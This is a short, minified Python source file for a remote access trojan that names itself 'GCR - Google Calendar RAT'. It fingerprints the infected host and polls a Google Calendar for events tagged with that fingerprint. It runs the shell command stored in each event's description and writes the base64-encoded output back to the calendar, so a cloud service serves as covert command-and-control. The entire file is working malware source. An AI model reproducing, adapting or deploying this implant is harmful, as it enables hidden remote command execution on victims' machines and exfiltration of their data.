_C='T00:00:00Z'
_B='description'
_A='summary'
import base64
from google.oauth2 import service_account
from googleapiclient.discovery import build
from datetime import datetime,timedelta
import subprocess,hashlib,socket,uuid,time
c2Calendar='PUT_YOUR_CALENDAR_ADDRESS_HERE'
pollingTime=0

def first_connection(summary,service):D='Europe/Rome';C='2023-05-30T00:00:00Z';B='timeZone';A='dateTime';E={_A:summary,'start':{A:C,B:D},'end':{A:C,B:D},_B:'whoami|'};F=service.events().insert(calendarId=c2Calendar,body=E).execute();print(f"[+] New connection initilialized: {F[_A]}")
def generate_hash_md5():B=socket.gethostname();C=':'.join(hex(uuid.getnode())[2:].zfill(12)[A:A+2]for A in range(0,12,2));D=B+C;A=hashlib.md5(D.encode()).hexdigest();print(f"[+] generated unique ID: {A}");return A
def get_sorted_events(date,service):A=date[:10]+_C;B=(datetime.fromisoformat(date[:10])+timedelta(days=1)).isoformat()[:10]+'T23:59:59Z';C=service.events().list(calendarId=c2Calendar,timeMin=A,timeMax=B,singleEvents=True,orderBy='startTime').execute();return C.get('items',[])
def execute_command(command):
        A=command;print(f"[+] Executing command: '{A}'")
        try:B=subprocess.check_output(A.split());C=base64.b64encode(B).decode('utf-8');return C
        except:print('[-] Error during execution')
def main():
        print('[+] GCR - Google Calendar RAT');id=generate_hash_md5();E='credentials.json';F=datetime(2023,5,30).isoformat()+_C;G=service_account.Credentials.from_service_account_file(E,scopes=['https://www.googleapis.com/auth/calendar']);C=build('calendar','v3',credentials=G)
        while 1:
                time.sleep(pollingTime);H=get_sorted_events(F,C);D=0
                for A in H:
                        I=A.get(_A,'')
                        if I==id:
                                D=+1;J=A['id'];K=A.get(_B,'Descrizione non disponibile')
                                try:B,L=K.split('|')
                                except:break
                                if B!=''and L=='':M=execute_command(B);N=f"{B}|{M}";A[_B]=N;O=C.events().update(calendarId=c2Calendar,eventId=J,body=A).execute();print(f"[+] sent command ouput for: {B}")
                if D==0:first_connection(id,C)
if __name__=='__main__':main()